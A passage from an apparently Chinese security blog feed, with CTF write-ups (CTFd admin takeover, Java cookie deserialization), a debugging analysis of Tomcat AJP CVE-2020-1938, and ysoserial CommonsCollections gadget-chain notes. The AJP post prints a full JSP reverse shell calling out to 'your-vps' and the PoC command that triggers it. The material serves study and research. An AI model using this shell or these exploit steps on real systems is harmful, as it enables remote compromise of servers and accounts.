alt="image-20200302215757406"></p><p>竟然程序无法通过app.py获得true，还有思路是利用ssrf或者CRLF注入去访问该内网地址，该思路明显不行，执行访问操作已经嵌入在php代码中.</p><p>只能利用组件漏洞，劫持<code>http://127.0.0.1:5000/api/eligible</code>该地址，使之不走app.py通信.走你设置的服务器，访问后回显的json格式带{“sucess”:True}</p><p>这里的环境变量再被程序里的 GuzzleHttp 使用</p><p>链接：<a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a></p><p><img src="./image-20200302220435844.png" srcset="/img/loading.gif" alt="image-20200302220435844"></p><p>Linux Labs起个服务,写index.php</p><p><img src="./image-20200302221347567.png" srcset="/img/loading.gif" alt="image-20200302221347567"></p><h1 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h1><p>该题利用CTFd 1day漏洞</p><p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p><p><a href="https://github.com/CTFd/CTFd/commit/f660ed1fb769126a2d149c26645bbde457a5c616" target="_blank" rel="noopener">https://github.com/CTFd/CTFd/commit/f660ed1fb769126a2d149c26645bbde457a5c616</a></p><p>账号注册逻辑中，接收用户名后验证身份，账户不存在则进行一次数据库写入操作。但是在写入数据库操作时，进行了一次<code>strip()</code>操作,所以创建用户时候添加空格就能够创建与数据库中相同的用户名.</p><p><img src="./image-20200302233144382.png" srcset="/img/loading.gif" alt="image-20200302233144382"></p><p>但是这样仍然接管不了真正的admin账户.需要利用到重置密码漏洞</p><p>forgot_password方法中传入的team值通过email取出，为上一步恶意注册用户结果</p><p><img src="./image-20200302235439643.png" srcset="/img/loading.gif" alt="image-20200302235439643"></p><p>跟进forgot_password方法,将用户名序列化token拼接到无用字符串中，发送到攻击者邮箱中.</p><p><img src="./image-20200302235649190.png" srcset="/img/loading.gif" alt="image-20200302235649190"></p><p>之后攻击者访问邮箱收到的url地址，进入到token验证逻辑中.而后就能够直接修改admin账户密码</p><p><img src="./image-20200303000548502.png" srcset="/img/loading.gif" alt="image-20200303000548502"></p><p><img src="./image-20200303000456072.png" srcset="/img/loading.gif" alt="image-20200303000456072"></p><ol><li>注册<em>空格+admin</em></li><li>向你的邮箱中发送重置密码请求</li></ol><p><img src="./image-20200303000737168.png" srcset="/img/loading.gif" alt="image-20200303000737168"></p><ol start="3"><li><p>打开<a href="http://9dd29132-adae-4782-9d00-deb092c278e9.node3.buuoj.cn/reset_password/ImFkbWluIg.Xl0qiA.GH7ren_SCFIaBZ43c3dDarzH6oU" target="_blank" rel="noopener">http://9dd29132-adae-4782-9d00-deb092c278e9.node3.buuoj.cn/reset_password/ImFkbWluIg.Xl0qiA.GH7ren_SCFIaBZ43c3dDarzH6oU</a></p><p><img src="./image-20200303000750485.png" srcset="/img/loading.gif" alt="image-20200303000750485"></p></li><li><p>修改密码后，访问settings成功得到admin管理账户</p></li></ol><p><img src="./image-20200303000849274.png" srcset="/img/loading.gif" alt="image-20200303000849274"></p><p>Backup =&gt; Export 获取flag</p><p><img src="./image-20200303001021836.png" srcset="/img/loading.gif" alt="image-20200303001021836"></p><h1 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h1><p>java两种命令执行构造</p><pre><code class="hljs reasonml"><span class="hljs-keyword">new</span> process<span class="hljs-constructor">Builder(<span class="hljs-params">cmd</span>)</span>.start<span class="hljs-literal">()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmd)</code></pre><p>jd-Gui打开war包</p><p>ClentinfoFilter能过对cookie反序列化,触发点为Tools.parse方法</p><p><img src="./image-20200303010252582.png" srcset="/img/loading.gif" alt="image-20200303010252582"></p><p>在Tools类中，复写的readObject中调用ProcessBuilder能够触发命令执行.当readObject被定义为私有属性，在反序列化时候将被优先调用.</p><p>现在就是如何构造obj参数的问题，可以利用testCall可控作为传入参数.定义个settestCall方法.</p><p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p><p><img src="./image-20200303015041644.png" srcset="/img/loading.gif" alt="image-20200303015041644"></p><p>设置cookie即可获得shell。这里还有一种方法是重写writeObject也能达到目的.</p><p><img src="./image-20200303020306698.png" srcset="/img/loading.gif" alt="image-20200303020306698"></p><p><img src="./image-20200303020244882.png" srcset="/img/loading.gif" alt="image-20200303020244882"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://glotozz.github.io/2020/03/02/V-N2020公开赛wp/#easyspringmvc" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/#easyspringmvc</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat-Ajp协议漏洞分析利用(CVE-2020-1938)</title>
    <link href="/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/"/>
    <url>/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟一跟最近新爆出的Apache AJP协议文件包含漏洞.</p><p>AJP 协议是定向包（面向包）协议，采用二进制形式代替文本形式，以提高性能。tomcat默认情况下配置两个Connector,HTTP协议8080端口,AJP协议8009端口</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><blockquote><p>idea+tomcat 9.0.30</p></blockquote><h2 id="Idea远程debug环境配置"><a href="#Idea远程debug环境配置" class="headerlink" title="Idea远程debug环境配置"></a>Idea远程debug环境配置</h2><p><img src="./image-20200225225712719.png" srcset="/img/loading.gif" alt="image-20200225225712719"></p><p>8000端口是你catalina.sh文件中的端口</p><p><img src="./image-20200225225847326.png" srcset="/img/loading.gif" alt="image-20200225225847326"></p><p><img src="./image-20200225225734179.png" srcset="/img/loading.gif" alt="image-20200225225734179"></p><h2 id="tomcat源码导入"><a href="#tomcat源码导入" class="headerlink" title="tomcat源码导入"></a>tomcat源码导入</h2><p>导入tomcat9.0.30中lib文件夹</p><p><img src="./image-20200225230001421.png" srcset="/img/loading.gif" alt="image-20200225230001421"></p><p><img src="./image-20200225222226699.png" srcset="/img/loading.gif" alt="image-20200225222226699"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><blockquote><p>git clone <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git</a></p></blockquote><p>根据安恒文章分析<a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ" target="_blank" rel="noopener">【WEB安全】Tomcat-Ajp协议漏洞分析</a>在org.apache.coyote.ajp.AjpProcessor this.prepareRequest()处打下断点</p><p><img src="./image-20200225230718396.png" srcset="/img/loading.gif" alt="image-20200225230718396"></p><p>Idea开启debug，运行poc 文件.</p><p><img src="./image-20200225230756222.png" srcset="/img/loading.gif" alt="image-20200225230756222"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="利用DefaultServlet实现任意文件下载"><a href="#利用DefaultServlet实现任意文件下载" class="headerlink" title="利用DefaultServlet实现任意文件下载"></a>利用DefaultServlet实现任意文件下载</h2><p>根据安恒文章给的该漏洞有两种利用方式</p><blockquote><p>1.利用DefaultServlet实现任意文件下载</p><p>​    - 无法跨webapps目录读取</p><p>2.通过jspservlet实现任意后缀文件包含</p></blockquote><p>跟进<code>prepareRequest</code>,根据<code>methodCode</code>返回请求方式</p><p><img src="./image-20200225232305864.png" srcset="/img/loading.gif" alt="image-20200225232305864"></p><p>关注点在<code>this.request.setAttribute</code>设置属性.分别为</p><blockquote><p>javax.servlet.include.path_info</p><p>javax.servlet.include.request_uri</p><p>javax.servlet.include.servlet_path</p></blockquote><p><img src="./image-20200225231733497.png" srcset="/img/loading.gif" alt="image-20200225231733497"></p><p>进入<code>service</code>方法逻辑中，对<code>request,response</code>对象操作.</p><p><img src="./image-20200225233225337.png" srcset="/img/loading.gif" alt="image-20200225233225337"></p><p><em>org/apache/catalina/connector/CoyoteAdapter.class</em>第336行选取容器，调用反射方法处理<code>request</code>和<code>response</code>对象。配置HTTP连接中需要的属性</p><p><img src="./image-20200225233344494.png" srcset="/img/loading.gif" alt="image-20200225233344494"></p><p>最后会调用<code>DefaultServlet.class</code>中<code>doGet</code>方法</p><p><img src="./image-20200225233809690.png" srcset="/img/loading.gif" alt="image-20200225233809690"></p><p>调用<code>getRelativePath</code>方法配置文件路径</p><p><img src="./image-20200225233859952.png" srcset="/img/loading.gif" alt="image-20200225233859952"></p><p>跟进方法，可以看到会获取request对象中</p><p>javax.servlet.include.path_info 与javax.servlet.include.servlet_path 拼接</p><p>并进行拼接.所以决定文件读取路径由这两个属性决定。但是只能限制在webapps目录中.</p><p><img src="./image-20200225234015081.png" srcset="/img/loading.gif" alt="image-20200225234015081"></p><p>为什么限制在webapps目录中.我们跟进<code>getResouce</code>方法中.该方法先判断缓存中是否有该文件，会新建File类读取文件,根据<code>file.getCannoicalPath()</code>返回的绝对路径.当访问<code>ajp://127.0.0.1:8009/</code>是访问<code>webapp/ROOT</code>目录.访问<code>ajp://127.0.0.1:8009/examples/</code>是访问<code>webapps/examples</code>目录….无法进行路径穿越,所以该漏洞只能在webapps目录下进行文件读取.之后进入normalize方法中对文件路径净化</p><p><img src="./image-20200225224719111.png" srcset="/img/loading.gif" alt="image-20200225224719111"></p><p>跟进normalize方法，可以看到对<code>./ , ../</code>等路径穿越符号进行净化，</p><p><img src="./image-20200225224807142.png" srcset="/img/loading.gif" alt="image-20200225224807142"></p><p>如：修改poc读取/webapps/examples下文件</p><pre><code class="hljs python">_,data = t.perform_request(<span class="hljs-string">'/examples/'</span>,attributes=[    &#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'req_attribute'</span>,<span class="hljs-string">'value'</span>:[<span class="hljs-string">'javax.servlet.include.request_uri'</span>,<span class="hljs-string">'/'</span>]&#125;,    &#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'req_attribute'</span>,<span class="hljs-string">'value'</span>:[<span class="hljs-string">'javax.servlet.include.path_info'</span>,args.file]&#125;,    &#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'req_attribute'</span>,<span class="hljs-string">'value'</span>:[<span class="hljs-string">'javax.servlet.include.servlet_path'</span>,<span class="hljs-string">'/'</span>]&#125;,    ])</code></pre><p><img src="./image-20200226154140972.png" srcset="/img/loading.gif" alt="image-20200226154140972"></p><p>调用栈</p><p><img src="./image-20200225225403791.png" srcset="/img/loading.gif" alt="image-20200225225403791"></p><h2 id="通过jspservlet实现任意后缀文件包含"><a href="#通过jspservlet实现任意后缀文件包含" class="headerlink" title="通过jspservlet实现任意后缀文件包含"></a>通过jspservlet实现任意后缀文件包含</h2><p>往ROOT/upload文件夹中上传1.txt文件，文件内容含有jsp反弹shell</p><p><img src="./image-20200226165842891.png" srcset="/img/loading.gif" alt="image-20200226165842891"></p><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.*"</span>%&gt;&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.util.*"</span>%&gt;&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.*"</span>%&gt;&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.net.*"</span>%&gt;&lt;%  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StreamConnector</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span><span class="hljs-class">  </span>&#123;    InputStream zd;    OutputStream fm;    StreamConnector( InputStream zd, OutputStream fm )    &#123;      <span class="hljs-keyword">this</span>.zd = zd;      <span class="hljs-keyword">this</span>.fm = fm;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;      BufferedReader fr  = <span class="hljs-keyword">null</span>;      BufferedWriter ctw = <span class="hljs-keyword">null</span>;      <span class="hljs-keyword">try</span>      &#123;        fr  = <span class="hljs-keyword">new</span> BufferedReader( <span class="hljs-keyword">new</span> InputStreamReader( <span class="hljs-keyword">this</span>.zd ) );        ctw = <span class="hljs-keyword">new</span> BufferedWriter( <span class="hljs-keyword">new</span> OutputStreamWriter( <span class="hljs-keyword">this</span>.fm ) );        <span class="hljs-keyword">char</span> buffer[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">8192</span>];        <span class="hljs-keyword">int</span> length;        <span class="hljs-keyword">while</span>( ( length = fr.read( buffer, <span class="hljs-number">0</span>, buffer.length ) ) &gt; <span class="hljs-number">0</span> )        &#123;          ctw.write( buffer, <span class="hljs-number">0</span>, length );          ctw.flush();        &#125;      &#125; <span class="hljs-keyword">catch</span>( Exception e )&#123;&#125;      <span class="hljs-keyword">try</span>      &#123;        <span class="hljs-keyword">if</span>( fr != <span class="hljs-keyword">null</span> )          fr.close();        <span class="hljs-keyword">if</span>( ctw != <span class="hljs-keyword">null</span> )          ctw.close();      &#125; <span class="hljs-keyword">catch</span>( Exception e )&#123;&#125;    &#125;  &#125;  <span class="hljs-keyword">try</span>  &#123;    String ShellPath;<span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">"os.name"</span>).toLowerCase().indexOf(<span class="hljs-string">"windows"</span>) == -<span class="hljs-number">1</span>) &#123;  ShellPath = <span class="hljs-keyword">new</span> String(<span class="hljs-string">"/bin/sh"</span>);&#125; <span class="hljs-keyword">else</span> &#123;  ShellPath = <span class="hljs-keyword">new</span> String(<span class="hljs-string">"cmd.exe"</span>);&#125;    Socket socket = <span class="hljs-keyword">new</span> Socket( <span class="hljs-string">"your-vps"</span>, <span class="hljs-number">8897</span> );    Process process = Runtime.getRuntime().exec( ShellPath );    ( <span class="hljs-keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();    ( <span class="hljs-keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  &#125; <span class="hljs-keyword">catch</span>( Exception e ) &#123;&#125;%&gt;</code></pre><p>文件包含漏洞依旧是利用以下三个属性可控，这里还要考虑进HTTP请求URL</p><pre><code class="hljs java">javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path</code></pre><p>修改POC内容如下</p><p><img src="./image-20200226174558549.png" srcset="/img/loading.gif" alt="image-20200226174558549"></p><p>运行poc,vps上获取到shell</p><pre><code class="hljs bash">python CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f 1.txt</code></pre><p><img src="./image-20200226165535075.png" srcset="/img/loading.gif" alt="image-20200226165535075"></p><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><p>当使用HTTP请求jsp文件时候，ajp协议在处理数据流会映射到jspServlet.service方法中 <em>(/org/apache/jasper/servlet/JspServlet.class)</em></p><p>jspUri结果为<code>javax.servlet.include.path_info</code>与<code>javax.servlet.include.servlet_path</code>两个属性拼接</p><p><img src="./image-20200226175339788.png" srcset="/img/loading.gif" alt="image-20200226175339788"></p><p>接着进入到serviceJspFile将1.txt文件当作jsp文件解析</p><p><img src="./image-20200226175538767.png" srcset="/img/loading.gif" alt="image-20200226175538767"></p><p>抄下作业，学习JSP加载流程。</p><p><a href="https://www.cnblogs.com/TomSnail/p/4380376.html" target="_blank" rel="noopener">https://www.cnblogs.com/TomSnail/p/4380376.html</a></p><p><img src="./image-20200226180128781.png" srcset="/img/loading.gif" alt="image-20200226180128781"></p><p>​    </p><p>调用栈</p><p><img src="./image-20200226182741093.png" srcset="/img/loading.gif" alt="image-20200226182741093"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.文件包含触发RCE只要HTTP请求不存在jsp文件，就能对上传的任意后缀文件解析.</p><p>2.可以发现一个挖掘思路，若可以调用jspServlet可以直接造成jsp解析</p><p>2.文件包含最后目录限制是由于请求的ajp://127.0.0.1:8009/被限制在了webapps无法通过路径穿越等跨目录读取文件。我看网上大多数修改poc是修改<code>javax.servlet.include.request_uri</code>属性进行目录跳转，但是实际测试中是不可行，我是把目录参数放置于HTTP请求URL中。也没搞懂目录放在<code>javax.servlet.include.servlet_path</code>会跳转到jspServlet类中.</p><p>3.代码能力太差，只能用别人的轮子。而且没有安恒的分析文章，无法debug断点下放.</p><p>4…..</p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化学习之CommonsCollections3</title>
    <link href="/2020/02/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections3/"/>
    <url>/2020/02/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在分析 yesoserial CommonsCollections3 在构造Runtime类时候并未调用transform方法中的反射类，而是使用javassist创建类并执行Runtime.exec(‘evil’);</p><p>环境依旧是jdk7;commons-collections3.1</p><h1 id="javassist知识"><a href="#javassist知识" class="headerlink" title="javassist知识"></a>javassist知识</h1><p>pom.xml(Maven下载javassist)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.19.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><p>Test.java</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.bqt.test;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">(String s)</span> </span>&#123;        System.out.println(s);    &#125;&#125;</code></pre><p>Persion.java</p><p>其中需要关注的是调用makeClassInitializer().insertBefore()能够创建staic代码块,JVM加载类时会执行这些静态的代码块</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.bqt.test.test;<span class="hljs-keyword">import</span> javassist.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;        ClassPool pool = ClassPool.getDefault();        CtClass cc = pool.get(<span class="hljs-string">"com.bqt.test.test"</span>);        <span class="hljs-comment">//修改hello方法代码块</span>        CtMethod cm = cc.getDeclaredMethod(<span class="hljs-string">"hello"</span>, <span class="hljs-keyword">new</span> CtClass[] &#123; pool.get(<span class="hljs-string">"java.lang.String"</span>) &#125;);        cm.setBody(<span class="hljs-string">"&#123;"</span> + <span class="hljs-string">"System.out.println(\"你好：\" + $1);System.out.println(\"你好：\" + \"fuck\");"</span> + <span class="hljs-string">"&#125;"</span>);        <span class="hljs-comment">//创建static代码块</span>        String staticSrting = <span class="hljs-string">"System.out.println(\"evil run\");"</span>;        cc.makeClassInitializer().insertBefore(staticSrting);        cc.writeFile(<span class="hljs-string">"d:/test"</span>);<span class="hljs-comment">//保存到指定目录</span>        cc.toClass(); <span class="hljs-comment">//加载修改后的类，注意：必须保证调用前此类未加载</span>        <span class="hljs-keyword">new</span> test().hello(<span class="hljs-string">"你大爷"</span>);    &#125;&#125;</code></pre><p>Test.class反编译结果</p><p><img src="./image-20200217193908064.png" srcset="/img/loading.gif" alt="image-20200217193908064"></p><h1 id="Ysoserial-CommonsCollections3"><a href="#Ysoserial-CommonsCollections3" class="headerlink" title="Ysoserial CommonsCollections3"></a>Ysoserial CommonsCollections3</h1><p>CommonsCollections3 后半段构造与CommonsCollections1构造相同，这里主要分析框出的两处不同点。</p><p><code>InvokerTransformer</code>类替换为<code>InstantiateTransformer</code>类,传入的object类为自建的templatesImpl。</p><p><code>new ConstantTransformer(TrAXFilter.class)</code>会返回一个<code>TrAXFilter.class</code>对象</p><p><img src="./image-20200217194014339.png" srcset="/img/loading.gif" alt="image-20200217194014339"></p><p>跟进下<code>CreateTemplatesImpl</code>类具体构造</p><ol><li><p>将<code>java.lang.Runtime.getRuntime().exec</code>载入static代码块</p></li><li><p>设置<code>absTranslet</code>(<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>)为StubTransletPayload父类</p></li><li><p>调用自建·Reflections.setFieldValue·设置<code>_bytecodes,_name,_tfactory</code>保证反序列化正常执行,并将创建的<code>StubTransletPayload</code>类加载进<code>templates</code></p></li></ol><p><img src="./image-20200217203457739.png" srcset="/img/loading.gif" alt="image-20200217203457739"></p><h1 id="反序列化-debug"><a href="#反序列化-debug" class="headerlink" title="反序列化 debug"></a>反序列化 debug</h1><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.ObjectInputStream;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"/Users/osword/Desktop/c3.ser"</span>);        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);        <span class="hljs-comment">//恢复对象</span>        ois.readObject();        ois.close();    &#125;&#125;</code></pre><p>执行<code>tranfrom</code>方法这里con为<code>TrAXFilter</code>类，iArgs参数为<code>javassist</code>字节</p><p><img src="./image-20200217203804394.png" srcset="/img/loading.gif" alt="image-20200217203804394"></p><p><code>newInstance</code>执行后会执行<code>TrAXFilter</code>类构造方法,相当于PHP中<code>__construct</code>方法</p><p><img src="./image-20200217204108629.png" srcset="/img/loading.gif" alt="image-20200217204108629"></p><p>defineTransletClasses该方法可以看作对StubTransletPayload类（ysoserial）构造定义</p><p><img src="./image-20200217231152937.png" srcset="/img/loading.gif" alt="image-20200217231152937"></p><p>跟进<code>defineTransletClasses</code>代码</p><p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code>通过对_class层叠加载父类和接口类.</p><p><img src="./image-20200217232232317.png" srcset="/img/loading.gif" alt="image-20200217232232317"></p><p>但是<code>defineTransletClasses</code>方法并未实例化传入<code>Javassist</code>构造的类（ysoserial定义的StubTransletPayload类）.</p><p>最后通过<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>就能成功加载Javassist构造的类.</p><p>并且<code>Runtime.getRuntime.exec</code>执行在static代码块中，在类加载后就会优先执行.</p><p><img src="./image-20200217232828408.png" srcset="/img/loading.gif" alt="image-20200217232828408"></p><p>总结一下javassist利用过程</p><pre><code class="hljs java">TrAXFilter.TrAXFilter();_transformer = (TransformerImpl) templates.newTransformer();TemplatesImpl.newTransformer(); TemplatesImpl.getTransletInstance();defineTransletClasses(); <span class="hljs-comment">//配置javassist构造的类</span>loader.defineClass(_bytecodes[i]);          <span class="hljs-comment">/*ysoserial工具</span><span class="hljs-comment">          Reflections.setFieldValue(templates, "_bytecodes", new byte[][] &#123;</span><span class="hljs-comment">            classBytes, ClassFiles.classAsBytes(Foo.class)</span><span class="hljs-comment">           &#125;);*/</span>(AbstractTranslet) _class[_transletIndex].newInstance(); <span class="hljs-comment">//ysoserial工具 final CtClass clazz = pool.get(StubTransletPayload.class.getName())</span>TemplatesImpl.loadClass();<span class="hljs-comment">//加载后优先执行staic代码块中的Runtime.getRuntime.exec()</span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>两种类构造方法:</p><p>​    1.反射类 2.javassist<br>分析时候可以先debug下ysoserial工具是怎么构造EXP搞清楚构造过程，在去分析反序列化就较容易了。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/190461" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190461</a></p><p><a href="https://baiqiantao.github.io/Java/aop/R77vuq/" target="_blank" rel="noopener">https://baiqiantao.github.io/Java/aop/R77vuq/</a></p><p><a href="https://github.com/jboss-javassist/javassist/wiki/Tutorial-1" target="_blank" rel="noopener">https://github.com/jboss-javassist/javassist/wiki/Tutorial-1</a></p><p><a href="https://blog.csdn.net/hao707822882/article/details/38666217" target="_blank" rel="noopener">https://blog.csdn.net/hao707822882/article/details/38666217</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化学习之CommonsCollections1</title>
    <link href="/2020/02/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1/"/>
    <url>/2020/02/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h1 id="ysoserial-debug环境搭建"><a href="#ysoserial-debug环境搭建" class="headerlink" title="ysoserial debug环境搭建"></a>ysoserial debug环境搭建</h1><p>编辑CommonsCollections1 </p><p>1.Program arguments是命令行输入 ,这里输入调试参数<code>CommonsCollections1 &#39;open /System/Applications/Calculator.app&#39;</code></p><p>2.jdk版本这里我设置jdk7</p><p><img src="./image-20200209200859793.png" srcset="/img/loading.gif" alt="image-20200209200859793"></p><p>在commonscollections1.main方法处debug即可.</p><p><img src="./image-20200209201046366.png" srcset="/img/loading.gif" alt="image-20200209201046366"></p><h1 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h1><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0"</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commonscollections1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span 